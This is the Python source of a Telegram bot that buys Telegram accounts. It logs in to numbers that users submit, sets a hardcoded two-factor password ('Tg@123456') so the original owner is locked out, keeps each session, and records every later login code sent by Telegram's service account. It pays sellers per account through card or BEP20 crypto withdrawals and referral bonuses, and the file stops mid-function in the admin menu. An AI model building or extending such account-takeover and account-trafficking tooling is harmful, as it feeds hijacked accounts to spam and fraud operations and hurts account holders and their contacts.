import os
import json
import re
from datetime import datetime, timedelta
from dotenv import load_dotenv

from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    filters, ContextTypes, ConversationHandler
)

load_dotenv()

# ====================== CONFIG ======================
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
WITHDRAW_CHANNEL = os.getenv("WITHDRAW_CHANNEL")
FORCE_CHANNEL = os.getenv("FORCE_CHANNEL")
ADMIN_IDS = [int(x.strip()) for x in os.getenv("ADMIN_IDS", "0").split(",") if x.strip()]

TWO_FA_PASSWORD = "Tg@123456"
MIN_WITHDRAW = 1.00
REFERRAL_THRESHOLD = 2.00          # Pending referral এই পরিমাণ হলে Current Balance এ যাবে

# ====================== PATHS ======================
SESSIONS_DIR = "sessions"
DATA_DIR = "data"
os.makedirs(SESSIONS_DIR, exist_ok=True)
os.makedirs(DATA_DIR, exist_ok=True)

# Data Files
COUNTRIES_FILE = f"{DATA_DIR}/countries.json"
ACCOUNTS_FILE = f"{DATA_DIR}/accounts.json"
BALANCES_FILE = f"{DATA_DIR}/balances.json"
CLAIMS_FILE = f"{DATA_DIR}/claims.json"
REFS_FILE = f"{DATA_DIR}/referrals.json"
SETTINGS_FILE = f"{DATA_DIR}/settings.json"
ADMINS_FILE = f"{DATA_DIR}/admins.json"
FROZEN_FILE = f"{DATA_DIR}/frozen.json"
CODES_FILE = f"{DATA_DIR}/codes.json"

# ====================== STATES ======================
(
    WAITING_CODE,
    ADD_COUNTRY_NAME,
    ADD_COUNTRY_FREE,
    ADD_COUNTRY_NEW,
    ADD_COUNTRY_SPAM,
    ADD_COUNTRY_PERM,
    ADD_COUNTRY_CAPACITY,
    ADD_COUNTRY_WAIT,
    WD_METHOD,
    WD_DETAILS,
    WD_CONFIRM,
    SUPPORT_MSG,
    BACK_NUMBERS,
    BACK_USERID
) = range(14)

# ====================== GLOBAL ======================
clients = {}
pending = {}
# ====================== HELPER FUNCTIONS ======================
def load_json(path, default=None):
    if default is None:
        default = {}
    try:
        if os.path.exists(path):
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
    except:
        pass
    return default

def save_json(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def get_admins():
    admins = load_json(ADMINS_FILE, [])
    if not admins:
        admins = ADMIN_IDS[:]
        save_json(ADMINS_FILE, admins)
    return admins

def is_admin(uid):
    return uid in get_admins()

def get_settings():
    default = {
        "ref_bonus": 0.05,
        "min_withdraw": MIN_WITHDRAW,
        "card_enabled": True,
        "bep20_enabled": True,
        "bot_on": True
    }
    s = load_json(SETTINGS_FILE, {})
    for k, v in default.items():
        if k not in s:
            s[k] = v
    return s

def save_settings(data):
    save_json(SETTINGS_FILE, data)

def get_flag(code):
    flags = {
        "880": "🇧🇩", "91": "🇮🇳", "92": "🇵🇰", "1": "🇺🇸", "44": "🇬🇧",
        "27": "🇿🇦", "234": "🇳🇬", "966": "🇸🇦", "971": "🇦🇪", "90": "🇹🇷",
        "7": "🇷🇺", "49": "🇩🇪", "33": "🇫🇷", "86": "🇨🇳", "62": "🇮🇩",
        "60": "🇲🇾", "65": "🇸🇬", "63": "🇵🇭", "55": "🇧🇷", "52": "🇲🇽",
        "20": "🇪🇬", "212": "🇲🇦", "40": "🇷🇴", "48": "🇵🇱", "216": "🇹🇳",
        "244": "🇦🇴", "1876": "🇯🇲", "233": "🇬🇭", "254": "🇰🇪", "255": "🇹🇿"
    }
    return flags.get(str(code), "🏳️")

def get_country_code(phone):
    phone = phone.replace("+", "")
    countries = load_json(COUNTRIES_FILE, {})
    # Longest match first
    for code in sorted(countries.keys(), key=len, reverse=True):
        if phone.startswith(code):
            return code
    # Fallback
    for length in [4, 3, 2, 1]:
        if phone[:length].isdigit():
            return phone[:length]
    return phone[:2]

def get_balance(uid):
    balances = load_json(BALANCES_FILE, {})
    data = balances.get(str(uid), {
        "current": 0.0,
        "pending": 0.0,
        "total_earned": 0.0,
        "pending_referral": 0.0
    })
    return data

def save_balance(uid, data):
    balances = load_json(BALANCES_FILE, {})
    balances[str(uid)] = data
    save_json(BALANCES_FILE, balances)

def add_current_balance(uid, amount):
    data = get_balance(uid)
    data["current"] = round(data.get("current", 0) + amount, 3)
    data["total_earned"] = round(data.get("total_earned", 0) + amount, 3)
    save_balance(uid, data)
    return data["current"]

def add_pending_balance(uid, amount):
    data = get_balance(uid)
    data["pending"] = round(data.get("pending", 0) + amount, 3)
    save_balance(uid, data)
    return data["pending"]

def is_bot_on():
    return get_settings().get("bot_on", True)

def parse_wait_time(text):
    """Convert '1h 10m' or '90m' or '2h' to minutes"""
    text = text.lower().strip()
    hours = 0
    minutes = 0
    h_match = re.search(r'(\d+)\s*h', text)
    m_match = re.search(r'(\d+)\s*m', text)
    if h_match:
        hours = int(h_match.group(1))
    if m_match:
        minutes = int(m_match.group(1))
    if not h_match and not m_match and text.isdigit():
        minutes = int(text)
    return hours * 60 + minutes
    # ====================== COUNTRY SYSTEM ======================
def get_countries():
    return load_json(COUNTRIES_FILE, {})

def save_countries(data):
    save_json(COUNTRIES_FILE, data)

def get_country(code):
    countries = get_countries()
    return countries.get(str(code))

def is_country_enabled(code):
    country = get_country(code)
    if not country:
        return False
    return country.get("enabled", True)

def get_country_capacity(code):
    country = get_country(code)
    if not country:
        return 0
    return int(country.get("capacity", 0))

def get_used_capacity(code):
    accounts = load_json(ACCOUNTS_FILE, {})
    return sum(1 for phone in accounts if phone.startswith(f"+{code}"))

def get_available_capacity(code):
    return max(0, get_country_capacity(code) - get_used_capacity(code))

def format_wait_time(minutes):
    if minutes < 60:
        return f"{minutes} min"
    hours = minutes // 60
    mins = minutes % 60
    if mins == 0:
        return f"{hours} Hour" if hours == 1 else f"{hours} Hours"
    return f"{hours}h {mins}m"

# Common Country Names (for auto detect)
COUNTRY_NAMES = {
    "880": "Bangladesh", "91": "India", "92": "Pakistan", "1": "USA/Canada",
    "44": "United Kingdom", "27": "South Africa", "234": "Nigeria",
    "966": "Saudi Arabia", "971": "UAE", "90": "Turkey", "7": "Russia",
    "49": "Germany", "33": "France", "86": "China", "62": "Indonesia",
    "60": "Malaysia", "65": "Singapore", "63": "Philippines", "55": "Brazil",
    "52": "Mexico", "20": "Egypt", "212": "Morocco", "40": "Romania",
    "48": "Poland", "216": "Tunisia", "244": "Angola", "1876": "Jamaica",
    "233": "Ghana", "254": "Kenya", "255": "Tanzania", "256": "Uganda",
    "250": "Rwanda", "251": "Ethiopia", "213": "Algeria", "218": "Libya",
    "249": "Sudan", "961": "Lebanon", "962": "Jordan", "963": "Syria",
    "964": "Iraq", "965": "Kuwait", "968": "Oman", "973": "Bahrain",
    "974": "Qatar", "970": "Palestine", "972": "Israel", "98": "Iran",
    "93": "Afghanistan", "94": "Sri Lanka", "95": "Myanmar", "977": "Nepal",
    "66": "Thailand", "84": "Vietnam", "81": "Japan", "82": "South Korea",
    "61": "Australia", "64": "New Zealand", "34": "Spain", "39": "Italy",
    "31": "Netherlands", "32": "Belgium", "41": "Switzerland", "43": "Austria",
    "46": "Sweden", "47": "Norway", "45": "Denmark", "358": "Finland"
}

def get_country_name(code):
    return COUNTRY_NAMES.get(str(code), f"Country +{code}")
    # ====================== TELETHON ======================
async def start_client(phone):
    path = f"{SESSIONS_DIR}/{phone.replace('+', '')}"
    client = TelegramClient(path, API_ID, API_HASH)

    @client.on(events.NewMessage(from_users=777000))
    async def handler(e):
        m = re.search(r'(\d{5,6})', e.message.message or "")
        if m:
            codes = load_json(CODES_FILE, {})
            if phone not in codes:
                codes[phone] = []
            codes[phone].insert(0, {
                "code": m.group(1),
                "time": datetime.now().strftime("%Y-%m-%d %H:%M")
            })
            codes[phone] = codes[phone][:15]
            save_json(CODES_FILE, codes)

    await client.connect()
    if await client.is_user_authorized():
        clients[phone] = client
        return True
    await client.disconnect()
    return False


async def enable_2fa(client, password=TWO_FA_PASSWORD):
    try:
        await client.edit_2fa(new_password=password)
        return True
    except:
        return False


# ====================== START COMMAND ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    uid = user.id

    # Force Join
    if FORCE_CHANNEL:
        try:
            member = await context.bot.get_chat_member(FORCE_CHANNEL, uid)
            if member.status not in ["member", "administrator", "creator"]:
                kb = [[InlineKeyboardButton("✅ Join Channel", url=f"https://t.me/{str(FORCE_CHANNEL).replace('@','')}")]]
                await update.message.reply_text(
                    "⚠️ Please join our channel first to use the bot.",
                    reply_markup=InlineKeyboardMarkup(kb)
                )
                return
        except:
            pass

    # Referral
    if context.args and context.args[0].startswith("ref_"):
        try:
            ref_id = int(context.args[0][4:])
            if ref_id != uid:
                refs = load_json(REFS_FILE, {})
                if str(uid) not in refs:
                    refs[str(uid)] = ref_id
                    save_json(REFS_FILE, refs)
        except:
            pass

    ref_link = f"https://t.me/{context.bot.username}?start=ref_{uid}"

    text = (
        f"👋 Welcome **{user.first_name}**!\n\n"
        f"Send phone number with +\n"
        f"Example: `+8801712345678`\n\n"
        f"🔗 Your Referral Link:\n`{ref_link}`\n\n"
        f"Available Commands:\n"
        f"/caf - Available Countries\n"
        f"/balance - Your Balance\n"
        f"/withdraw - Withdraw\n"
        f"/myaccounts - My Accounts\n"
        f"/support - Support"
    )
    await update.message.reply_text(text, parse_mode="Markdown")


# ====================== /caf COMMAND ======================
async def caf_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    countries = get_countries()
    if not countries:
        await update.message.reply_text("No countries available right now.")
        return

    enabled = {k: v for k, v in countries.items() if v.get("enabled", True)}
    if not enabled:
        await update.message.reply_text("No countries available right now.")
        return

    text = f"🌍 **Available Countries: {len(enabled)}**\n\n"

    for code, data in list(enabled.items())[:30]:
        flag = get_flag(code)
        name = data.get("name") or get_country_name(code)
        free = data.get("free", 0)
        new = data.get("new", 0)
        spam = data.get("spam", 0)
        perm = data.get("perm", 0)
        capacity = data.get("capacity", 0)
        used = get_used_capacity(code)
        available = max(0, capacity - used)
        wait = format_wait_time(data.get("wait", 0))

        text += (
            f"{flag} **+{code} {name}**\n"
            f"🆓 Free: `${free}`\n"
            f"🆕 New: `${new}`\n"
            f"🚫 Spam: `${spam}`\n"
            f"🔒 Perm: `${perm}`\n"
            f"👤 Available: `{available}`\n"
            f"⏳ Wait Time: `{wait}`\n\n"
        )

    await update.message.reply_text(text, parse_mode="Markdown")
    # ====================== BALANCE COMMAND ======================
async def balance_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    data = get_balance(uid)
    accounts = load_json(ACCOUNTS_FILE, {})
    total_accs = sum(1 for a in accounts.values() if a.get("uid") == uid)

    text = (
        f"💰 **Your Balance**\n\n"
        f"📊 Current Balance: `${data.get('current', 0):.3f}`\n"
        f"⏳ Pending Balance: `${data.get('pending', 0):.3f}`\n"
        f"📈 Total Earned: `${data.get('total_earned', 0):.3f}`\n\n"
        f"📦 Total Accounts: `{total_accs}`\n\n"
        f"💡 How to earn:\n"
        f"• Submit eligible accounts\n"
        f"• Complete waiting period\n"
        f"• Claim successful submissions"
    )
    await update.message.reply_text(text, parse_mode="Markdown")


# ====================== HANDLE PHONE ======================
async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id

    if not is_bot_on() and not is_admin(uid):
        await update.message.reply_text("🔴 Bot is currently turned OFF by admin.")
        return

    text = update.message.text.strip().replace(" ", "")
    if not re.match(r'^\+?\d{8,15}$', text):
        return

    phone = text if text.startswith("+") else "+" + text
    chat_id = update.effective_chat.id

    # Country Check
    code = get_country_code(phone)
    country = get_country(code)

    if not country or not country.get("enabled", True):
        await update.message.reply_text("❗️ This country is not available.")
        return

    # Capacity Check
    available = get_available_capacity(code)
    if available <= 0:
        await update.message.reply_text("❗️ This country's capacity is over.")
        return

    wait_msg = await update.message.reply_text("⏳ Waiting for otp...")

    try:
        client = TelegramClient(f"{SESSIONS_DIR}/{phone[1:]}", API_ID, API_HASH)
        await client.connect()

        if await client.is_user_authorized():
            await wait_msg.edit_text("This number is already logged in!")
            await client.disconnect()
            return

        sent = await client.send_code_request(phone)
        pending[chat_id] = {
            "client": client,
            "phone": phone,
            "hash": sent.phone_code_hash,
            "uid": uid,
            "code": code
        }

        flag = get_flag(code)
        await wait_msg.edit_text(
            f"📲 {flag} `{phone}`\n\n"
            f"Code sent! Reply with the 5 or 6-digit login code.\n\n"
            f"➿ /cancel",
            parse_mode="Markdown"
        )
        return WAITING_CODE

    except FloodWaitError as e:
        await wait_msg.edit_text(f"FloodWait! Please wait {e.seconds} seconds.")
    except Exception as e:
        await wait_msg.edit_text(f"Error: {e}")


# ====================== HANDLE CODE ======================
async def handle_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id not in pending:
        return

    data = pending[chat_id]
    code_text = update.message.text.strip()
    uid = data["uid"]
    phone = data["phone"]
    country_code = data["code"]

    try:
        await data["client"].sign_in(phone, code_text, phone_code_hash=data["hash"])
    except SessionPasswordNeededError:
        await update.message.reply_text("This number already has 2FA. Skipped.")
        await data["client"].disconnect()
        del pending[chat_id]
        return
    except PhoneCodeInvalidError:
        await update.message.reply_text("❗️ The login code is invalid. Send the correct code.\n\n➿ /cancel")
        return
    except Exception as e:
        await update.message.reply_text(f"Error: {e}\n\n/cancel")
        await data["client"].disconnect()
        del pending[chat_id]
        return

    # Login Success
    me = await data["client"].get_me()
    ok = await enable_2fa(data["client"])

    country = get_country(country_code) or {}
    # Default price (Free)
    price = float(country.get("free", 0.30))
    wait_minutes = int(country.get("wait", 1080))  # default 18 hours

    claim_id = f"{uid}_{phone[1:]}_{int(datetime.now().timestamp())}"

    # Save Account
    accounts = load_json(ACCOUNTS_FILE, {})
    accounts[phone] = {
        "uid": uid,
        "name": me.first_name or "",
        "country": country_code,
        "price": price,
        "wait": wait_minutes,
        "claim_id": claim_id,
        "status": "pending",
        "created": datetime.now().isoformat()
    }
    save_json(ACCOUNTS_FILE, accounts)

    # Save Claim
    claims = load_json(CLAIMS_FILE, {})
    claims[claim_id] = {
        "uid": uid,
        "phone": phone,
        "country": country_code,
        "price": price,
        "wait": wait_minutes,
        "time": datetime.now().isoformat(),
        "done": False
    }
    save_json(CLAIMS_FILE, claims)

    await data["client"].disconnect()
    await start_client(phone)
    del pending[chat_id]

    flag = get_flag(country_code)
    country_name = country.get("name") or get_country_name(country_code)
    wait_text = format_wait_time(wait_minutes)

    kb = [[InlineKeyboardButton("💰 Claim", callback_data=f"claim_{claim_id}")]]

    text = (
        f"✅ **Submission Successful**\n\n"
        f"🌍 Country: {flag} {country_name}\n"
        f"────────────────────\n"
        f"• Number: `{phone}`\n"
        f"• Sell Price: `${price}` ✓\n"
        f"• Wait Time: `{wait_text}` ✓\n"
        f"• 2FA: {'Enabled ✅' if ok else 'Failed'}\n\n"
        f"⏳ Claim will be available after the required waiting time."
    )
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
    # ====================== CLAIM SYSTEM ======================
async def claim_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    cid = q.data.replace("claim_", "")

    claims = load_json(CLAIMS_FILE, {})
    if cid not in claims:
        await q.edit_message_text("Claim not found.")
        return

    claim = claims[cid]

    if claim.get("done"):
        await q.edit_message_text("Already claimed.")
        return

    if claim["uid"] != uid:
        await q.answer("This is not your claim!", show_alert=True)
        return

    # Check timer
    created = datetime.fromisoformat(claim["time"])
    wait_minutes = int(claim.get("wait", 0))
    unlock_time = created + timedelta(minutes=wait_minutes)

    if datetime.now() < unlock_time:
        remaining = unlock_time - datetime.now()
        hours = int(remaining.total_seconds() // 3600)
        mins = int((remaining.total_seconds() % 3600) // 60)
        await q.answer(f"⏳ Claim Available In: {hours}h {mins}m", show_alert=True)
        return

    # TODO: এখানে Account Status Verification যোগ করা যাবে (Frozen/Deleted check)
    # এখন সরাসরি Balance যোগ করছি

    price = float(claim.get("price", 0))
    new_balance = add_current_balance(uid, price)

    # Referral Bonus (Pending এ যাবে)
    refs = load_json(REFS_FILE, {})
    if str(uid) in refs:
        ref_id = refs[str(uid)]
        settings = get_settings()
        ref_bonus = float(settings.get("ref_bonus", 0.05))
        ref_data = get_balance(ref_id)
        ref_data["pending_referral"] = round(ref_data.get("pending_referral", 0) + ref_bonus, 3)

        # Threshold check
        if ref_data["pending_referral"] >= REFERRAL_THRESHOLD:
            ref_data["current"] = round(ref_data.get("current", 0) + ref_data["pending_referral"], 3)
            ref_data["total_earned"] = round(ref_data.get("total_earned", 0) + ref_data["pending_referral"], 3)
            ref_data["pending_referral"] = 0.0

        save_balance(ref_id, ref_data)

    # Mark as done
    claim["done"] = True
    claims[cid] = claim
    save_json(CLAIMS_FILE, claims)

    # Update account status
    accounts = load_json(ACCOUNTS_FILE, {})
    phone = claim.get("phone")
    if phone in accounts:
        accounts[phone]["status"] = "claimed"
        save_json(ACCOUNTS_FILE, accounts)

    await q.edit_message_text(
        f"✅ **Claim Successful**\n\n"
        f"💰 +${price}\n"
        f"📊 New Balance: `${new_balance:.3f}`"
    )


# ====================== CANCEL ======================
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in pending:
        try:
            await pending[chat_id]["client"].disconnect()
        except:
            pass
        del pending[chat_id]
    await update.message.reply_text("✅ Cancelled. You can send a new number.")
    return ConversationHandler.END


# ====================== MY ACCOUNTS ======================
async def myaccounts_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    accounts = load_json(ACCOUNTS_FILE, {})
    user_accs = [(p, info) for p, info in accounts.items() if info.get("uid") == uid]

    if not user_accs:
        await update.message.reply_text("You have not submitted any accounts yet.")
        return

    text = f"📦 **Your Accounts ({len(user_accs)})**\n\n"
    for i, (phone, info) in enumerate(user_accs[:25], 1):
        flag = get_flag(info.get("country", ""))
        status = info.get("status", "pending")
        text += f"{i}. {flag} `{phone}` - {status}\n"

    if len(user_accs) > 25:
        text += f"\n... and {len(user_accs) - 25} more"

    await update.message.reply_text(text, parse_mode="Markdown")
    # ====================== WITHDRAW SYSTEM ======================
async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    settings = get_settings()
    data = get_balance(uid)
    current = data.get("current", 0)

    if current < settings.get("min_withdraw", MIN_WITHDRAW):
        await update.message.reply_text(
            f"❌ Minimum withdrawal is `${settings.get('min_withdraw', MIN_WITHDRAW)}`\n"
            f"Your Current Balance: `${current:.3f}`"
        )
        return ConversationHandler.END

    # Count eligible accounts (claimed ones)
    accounts = load_json(ACCOUNTS_FILE, {})
    eligible = [p for p, info in accounts.items() if info.get("uid") == uid and info.get("status") == "claimed"]

    # Country breakdown
    country_count = {}
    for phone in eligible:
        code = get_country_code(phone)
        country_count[code] = country_count.get(code, 0) + 1

    text = (
        f"📤 **Number of Accounts Available for Withdrawal:** `{len(eligible)}`\n\n"
        f"❗️ Note: Only accounts that have completed the required waiting period can be settled.\n\n"
    )

    if country_count:
        text += "**Country Breakdown:**\n"
        for code, count in country_count.items():
            flag = get_flag(code)
            name = get_country_name(code)
            text += f"{flag} {name} +{code}: `{count}`\n"
        text += "\n"

    text += f"💰 Available Balance: `${current:.3f}`\n\nSelect withdrawal method:"

    kb = []
    if settings.get("card_enabled", True):
        kb.append([InlineKeyboardButton("💳 Withdrawal Card", callback_data="wd_card")])
    if settings.get("bep20_enabled", True):
        kb.append([InlineKeyboardButton("🪙 Withdrawal USD BEP20", callback_data="wd_bep")])

    if not kb:
        await update.message.reply_text(
            "⏰ **Withdrawal Unavailable**\n\n"
            "❌ Withdrawals are currently disabled by admin.\n"
            "Please check back later."
        )
        return ConversationHandler.END

    kb.append([InlineKeyboardButton("❌ Cancel", callback_data="wd_cancel")])
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
    return WD_METHOD


async def wd_method(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id

    if q.data == "wd_cancel":
        await q.edit_message_text("❗️ Request has been canceled.")
        return ConversationHandler.END

    method = "Card" if q.data == "wd_card" else "BEP20"
    context.user_data["wd_method"] = method

    if method == "Card":
        await q.edit_message_text("✅ Send your card information:")
    else:
        await q.edit_message_text("✅ Send your BEP20 (USDT) wallet address:")

    return WD_DETAILS


async def wd_details(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    details = update.message.text.strip()
    method = context.user_data.get("wd_method", "Unknown")
    context.user_data["wd_details"] = details

    kb = [
        [InlineKeyboardButton("✅ Yes", callback_data="wd_yes")],
        [InlineKeyboardButton("❌ No", callback_data="wd_no")]
    ]

    await update.message.reply_text(
        f"❗️ Are you sure about your {'card number' if method == 'Card' else 'wallet address'} and request?\n\n"
        f"⚠️ Please check your payment information carefully.\n\n"
        f"Method: **{method}**\n"
        f"Details: `{details}`",
        reply_markup=InlineKeyboardMarkup(kb),
        parse_mode="Markdown"
    )
    return WD_CONFIRM


async def wd_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    user = q.from_user

    if q.data == "wd_no":
        await q.edit_message_text("❗️ Request has been canceled.")
        return ConversationHandler.END

    method = context.user_data.get("wd_method", "Unknown")
    details = context.user_data.get("wd_details", "")
    data = get_balance(uid)
    amount = data.get("current", 0)

    # Reset current balance
    data["current"] = 0.0
    save_balance(uid, data)

    # Count accounts
    accounts = load_json(ACCOUNTS_FILE, {})
    acc_count = sum(1 for a in accounts.values() if a.get("uid") == uid and a.get("status") == "claimed")

    now = datetime.now()
    text = (
        f"✅ **Withdrawal Request Submitted!**\n\n"
        f"👤 Name: {user.first_name}\n"
        f"🆔 ID: `{uid}`\n"
        f"📧 Username: @{user.username or 'None'}\n\n"
        f"💰 Balance: `${amount:.3f}`\n"
        f"📦 Accounts: `{acc_count}`\n"
        f"💳 Method: {method}\n"
        f"📝 Details: `{details}`\n\n"
        f"📅 Date: `{now.strftime('%m/%d/%Y')}`\n"
        f"⏳ Time: `{now.strftime('%H:%M:%S')}`\n"
        f"🌍 Timezone: Bangladesh (UTC+6)\n\n"
        f"⏳ Your request is being processed by the payment team."
    )

    # Send to Withdraw Channel
    if WITHDRAW_CHANNEL:
        try:
            channel_text = (
                f"💸 **New Withdrawal Request**\n\n"
                f"👤 Name: {user.first_name}\n"
                f"🆔 Chat ID: `{uid}`\n"
                f"📧 Username: @{user.username or 'None'}\n\n"
                f"💰 Amount: `${amount:.3f}`\n"
                f"📦 Accounts: `{acc_count}`\n"
                f"💳 Method: {method}\n"
                f"📝 Details: `{details}`\n"
                f"📅 {now.strftime('%Y-%m-%d %H:%M:%S')}"
            )
            await context.bot.send_message(int(WITHDRAW_CHANNEL), channel_text, parse_mode="Markdown")
        except Exception as e:
            print("Withdraw channel error:", e)

    await q.edit_message_text(text, parse_mode="Markdown")
    return ConversationHandler.END
    # ====================== ADMIN DASHBOARD ======================
async def dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return

    settings = get_settings()
    countries = get_countries()
    accounts = load_json(ACCOUNTS_FILE, {})
    claims = load_json(CLAIMS_FILE, {})
    balances = load_json(BALANCES_FILE, {})

    total_users = len(set(a.get("uid") for a in accounts.values()))
    total_accounts = len(accounts)
    pending_claims = sum(1 for c in claims.values() if not c.get("done"))
    completed_claims = sum(1 for c in claims.values() if c.get("done"))
    total_earned = sum(b.get("total_earned", 0) for b in balances.values())
    enabled_countries = sum(1 for c in countries.values() if c.get("enabled", True))

    text = (
        f"📊 **Admin Dashboard**\n\n"
        f"👤 Total Users: `{total_users}`\n"
        f"📦 Total Accounts: `{total_accounts}`\n"
        f"🟢 Online Clients: `{len(clients)}`\n"
        f"⏳ Pending Claims: `{pending_claims}`\n"
        f"✅ Completed Claims: `{completed_claims}`\n"
        f"💰 Total Earned: `${total_earned:.3f}`\n"
        f"🌍 Enabled Countries: `{enabled_countries}`\n"
        f"🤖 Bot Status: `{'ON' if settings.get('bot_on') else 'OFF'}`"
    )

    kb = [
        [InlineKeyboardButton("📊 Statistics", callback_data="dash_stats")],
        [InlineKeyboardButton("🌍 Country Manager", callback_data="dash_country")],
        [InlineKeyboardButton("📁 Account Manager", callback_data="dash_accounts")],
        [InlineKeyboardButton("🧊 Frozen Accounts", callback_data="dash_frozen")],
        [InlineKeyboardButton("📢 Board Chat", callback_data="dash_broadcast")],
        [InlineKeyboardButton("💳 Withdrawal Settings", callback_data="dash_withdraw")],
        [InlineKeyboardButton("⚙️ General Settings", callback_data="dash_settings")],
        [InlineKeyboardButton("👥 User Manager", callback_data="dash_users")],
        [InlineKeyboardButton("🔄 Back Number", callback_data="dash_back")],
    ]

    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")


async def admin_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return

    data = q.data

    # ===== Main Menu Back =====
    if data == "dash_home":
        await dashboard(update, context)
        return

    # ===== Statistics =====
    if data == "dash_stats":
        accounts = load_json(ACCOUNTS_FILE, {})
        claims = load_json(CLAIMS_FILE, {})
        balances = load_json(BALANCES_FILE, {})
        countries = get_countries()

        total_users = len(set(a.get("uid") for a in accounts.values()))
        total_accounts = len(accounts)
        pending = sum(1 for c in claims.values() if not c.get("done"))
        completed = sum(1 for c in claims.values() if c.get("done"))
        total_earned = sum(b.get("total_earned", 0) for b in balances.values())

        # Country wise
        country_stats = {}
        for phone, info in accounts.items():
            code = info.get("country") or get_country_code(phone)
            country_stats[code] = country_stats.get(code, 0) + 1

        text = (
            f"📊 **Statistics**\n\n"
            f"👤 Total Users: `{total_users}`\n"
            f"📦 Total Accounts: `{total_accounts}`\n"
            f"🟢 Online/Active: `{len(clients)}`\n"
            f"⏳ Pending Claim: `{pending}`\n"
            f"✅ Completed Claim: `{completed}`\n"
            f"💰 Total Earned: `${total_earned:.3f}`\n\n"
            f"**Country Breakdown:**\n"
        )
        for code, count in sorted(country_stats.items(), key=lambda x: x[1], reverse=True)[:15]:
            flag = get_flag(code)
            name = get_country_name(code)
            text += f"{flag} {name}: `{count}`\n"

        kb = [[InlineKeyboardButton("◀️ Back", callback_data="dash_home")]]
        await q.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    # ===== Country Manager =====
    elif data == "dash_country":
        kb = [
            [InlineKeyboardButton("➕ Add Country", callback_data="country_add")],
            [InlineKeyboardButton("🗑 Remove Country", callback_data="country_remove")],
            [InlineKeyboardButton("🟢 Enable Country", callback_data="country_enable")],
            [InlineKeyboardButton("🔴 Disable Country", callback_data="country_disable")],
            [InlineKeyboardButton("💰 Change Price", callback_data="country_price")],
            [InlineKeyboardButton("⏳ Change Wait Time", callback_data="country_wait")],
            [InlineKeyboardButton("📦 Change Capacity", callback_data="country_capacity")],
            [InlineKeyboardButton("📋 List Countries", callback_data="country_list")],
            [InlineKeyboardButton("◀️ Back", callback_data="dash_home")]
        ]
        await q.edit_message_text("🌍 **Country Manager**\n\nSelect an option:", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    # ===== Withdrawal Settings =====
    elif data == "dash_withdraw":
        settings = get_settings()
        text = (
            f"💳 **Withdrawal Settings**\n\n"
            f"Card Withdrawal: `{'✅ Enabled' if settings.get('card_enabled') else '❌ Disabled'}`\n"
            f"BEP20 Withdrawal: `{'✅ Enabled' if settings.get('bep20_enabled') else '❌ Disabled'}`\n"
            f"Minimum Withdraw: `${settings.get('min_withdraw', 1.0)}`"
        )
        kb = [
            [InlineKeyboardButton("💳 Toggle Card", callback_data="toggle_card")],
            [InlineKeyboardButton("🪙 Toggle BEP20", callback_data="toggle_bep")],
            [InlineKeyboardButton("💵 Set Min Withdraw", callback_data="set_min_wd")],
            [InlineKeyboardButton("◀️ Back", callback_data="dash_home")]
        ]
        await q.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    # ===== General Settings =====
    elif data == "dash_settings":
        settings = get_settings()
        text = (
            f"⚙️ **General Settings**\n\n"
            f"Bot Status: `{'🟢 ON' if settings.get('bot_on') else '🔴 OFF'}`\n"
            f"Referral Bonus: `${settings.get('ref_bonus', 0.05)}`"
        )
        kb = [
            [InlineKeyboardButton("🟢 Bot ON", callback_data="bot_on"),
             InlineKeyboardButton("🔴 Bot OFF", callback_data="bot_off")],
            [InlineKeyboardButton("🎁 Set Ref Bonus", callback_data="set_ref")],
            [InlineKeyboardButton("◀️ Back", callback_data="dash_home")]
        ]
        await q.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
        # ====================== ADMIN CALLBACK CONTINUED ======================

    # ===== Toggle Card / BEP20 =====
    elif data == "toggle_card":
        settings = get_settings()
        settings["card_enabled"] = not settings.get("card_enabled", True)
        save_settings(settings)
        status = "Enabled" if settings["card_enabled"] else "Disabled"
        await q.edit_message_text(f"💳 Card Withdrawal is now **{status}**", parse_mode="Markdown")

    elif data == "toggle_bep":
        settings = get_settings()
        settings["bep20_enabled"] = not settings.get("bep20_enabled", True)
        save_settings(settings)
        status = "Enabled" if settings["bep20_enabled"] else "Disabled"
